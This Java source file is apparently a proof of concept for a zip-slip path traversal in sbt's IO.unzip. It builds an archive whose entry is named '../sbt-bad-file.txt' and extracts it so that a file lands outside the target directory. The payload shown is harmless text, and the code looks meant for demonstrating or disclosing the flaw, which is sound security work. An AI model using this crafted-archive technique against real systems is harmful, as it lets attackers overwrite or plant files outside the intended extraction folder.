package org.example;

import sbt.io.IO;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SbtAttack {

    public static void main(String[] args) throws IOException {
        String zipFileName = "sbt-exploit.zip";
        String fileNameInsideZip = "../sbt-bad-file.txt";
        createZip(zipFileName, fileNameInsideZip, "Some file content");

        File destDir = new File("sbt-unzipped");
        destDir.mkdir();

        IO.unzip(new File(zipFileName), destDir, name -> true, false);
    }

    private static void createZip(String zipFileName, String entryName, String fileContent) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(zipFileName);
             ZipOutputStream zipOut = new ZipOutputStream(fos)) {
            ZipEntry zipEntry = new ZipEntry(entryName);
            zipOut.putNextEntry(zipEntry);
            zipOut.write(fileContent.getBytes());
            zipOut.closeEntry();
        }
    }
}